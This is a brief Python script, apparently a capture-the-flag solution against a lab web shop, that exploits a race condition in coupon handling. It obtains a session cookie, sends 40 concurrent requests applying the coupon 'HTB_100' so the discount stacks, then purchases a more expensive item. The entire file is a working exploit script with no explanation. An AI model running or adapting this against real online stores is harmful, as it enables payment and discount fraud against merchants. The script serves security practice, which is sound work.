#!/usr/bin/env python3

import requests as req
import concurrent.futures

url: str = "http://139.59.171.86:30077/"

res = req.post(url + "api/purchase", data={"item": "A2"})
cookies = {"session": res.cookies["session"]}

def make_request():
    res2 = req.post(url + "api/coupons/apply", cookies=cookies, data={"coupon_code": "HTB_100"})
    print(res2.text + "\n\n")

with concurrent.futures.ThreadPoolExecutor() as executor:
    for _ in range(40):
        executor.submit(make_request)


purchase = req.post(url + "api/purchase", cookies=cookies, data={"item": "C8"})

print(purchase.text)
